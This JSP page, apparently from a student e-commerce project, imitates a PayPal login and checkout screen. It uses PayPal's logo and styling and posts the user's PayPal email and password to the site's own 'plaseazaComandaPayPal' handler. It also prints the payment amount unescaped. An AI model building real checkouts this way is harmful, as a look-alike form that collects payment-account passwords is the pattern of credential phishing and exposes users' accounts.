<%@ page language="java" contentType="text/html; charset=ISO-8859-1"
    pageEncoding="ISO-8859-1"%>
<!DOCTYPE html>
<html>
<head>
<meta charset="ISO-8859-1">
<title>Metoda Plata PayPal</title>
</head>
<body>
<%
					String sumaDePlata = (String) request.getAttribute("sumaDePlata");
				%>
				<h1 style="text-align:center;"> You have to pay: <%=sumaDePlata%></h1>
<div id="main" class="main " role="main">
    <section id="login" class="login" data-role="page" data-title="Log in to your PayPal account">
        <div class="corral">
              <div id="content" class="contentContainer">
                <header>
                    <p class="paypal-logo paypal-logo-long"><center><img src="https://www.paypalobjects.com/images/shared/paypal-logo-129x32.png"></center></p>
                  </header>
                <form action="plaseazaComandaPayPal" method="post" class="proceed maskable" name="login" autocomplete="off" novalidate="">
                    <div id="passwordSection" class="clearfix">
                        <div class="textInput" id="login_emaildiv">
                            <div class="fieldWrapper">
                                <label for="email" class="fieldLabel">Email</label>
                                <input  name="email" id="email" name="login_email" type="email" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" autocomplete="off" placeholder="Email">
                           </div>
                        </div>
                        
                     <div class="textInput lastInputField" id="login_passworddiv">
                         <div class="fieldWrapper"><label for="password" class="fieldLabel">Password</label>
                            <input name="password" id="password" name="login_password" type="password" class="hasHelp  validateEmpty " required="required" aria-required="true" value="" placeholder="Password">
                       </div>
                     </div>
                   </div>
               <div class="actions actionsSpaced"><button class="button actionContinue" type="submit" id="btnLogin" name="btnLogin" value="Login">Checkout</button></div>
               </form></div></div></section></div>
</body>
<style>
.corral{margin:0 auto;width:460px}.contentContainer{position:relative;margin:130px auto 0;padding:30px 10% 50px;-webkit-border-radius:5px;-moz-border-radius:5px;
-khtml-border-radius:5px;border-radius:5px}.textInput input,.textInput textarea{height:44px;width:100%;padding:0 10px;border:1px solid #9da3a6;background:#fff;
text-overflow:ellipsis;-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box;-webkit-border-radius:4px;-moz-border-radius:4px;-khtml-border-radius:4px;
border-radius:4px;-webkit-box-shadow:none;-moz-box-shadow:none;box-shadow:none;color:#000;font-size:1em;font-family:Helvetica,Arial,sans-serif;font-weight:400;direction:ltr}.textInput{position:relative;margin:0 0 10px}.textInput .fieldLabel{position:absolute;color:#6c7378;clip:rect(1px 1px 1px 1px);
clip:rect(1px,1px,1px,1px);padding:0;border:0;height:1px;width:1px;overflow:hidden}.button:hover,a.button:hover,a.button:link:hover,a.button:visited:hover{background-color:#e4b418;outline:0}
.button,a.button,a.button:link,a.button:visited{width:100%;height:44px;padding:0;border:0;display:block;background-color:#fec91b;-webkit-box-shadow:none;
-moz-box-shadow:none;box-shadow:none;-webkit-border-radius:4px;-moz-border-radius:4px;-khtml-border-radius:4px;border-radius:4px;-webkit-box-sizing:border-box;
-moz-box-sizing:border-box;box-sizing:border-box;cursor:pointer;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;-o-appearance:none;appearance:none;
-webkit-tap-highlight-color:transparent;color:#fff;font-size:1em;text-align:center;font-weight:700;font-family:HelveticaNeue-Medium,"Helvetica Neue Medium",HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;
text-shadow:none;text-decoration:none;-webkit-transition:background-color .4s ease-out;-moz-transition:background-color .4s ease-out;-o-transition:background-color .4s ease-out;
transition:background-color .4s ease-out;-webkit-font-smoothing:antialiased}.actionsSpaced{margin-top:30px}.fieldWrapper{position:relative;z-index:2;width:100%}.forgotLink{margin:20px auto;padding-bottom:20px;
border-bottom:1px solid #cbd2d6;text-align:center}.button.secondary,a.button.secondary,a.button.secondary:link,a.button.secondary:visited{background-color:#e1e7eb;color:#2c2e2f}a.button,a.button:link,a.button:visited{padding-top:11px}
a,a:link,a:visited{color:#FEC91B;font-family:HelveticaNeue,"Helvetica Neue",Helvetica,Arial,sans-serif;font-weight:400;text-decoration:none;-webkit-transition:color .2s ease-out;
-moz-transition:color .2s ease-out;-o-transition:color .2s ease-out;transition:color .2s ease-out}
</style>
</html>
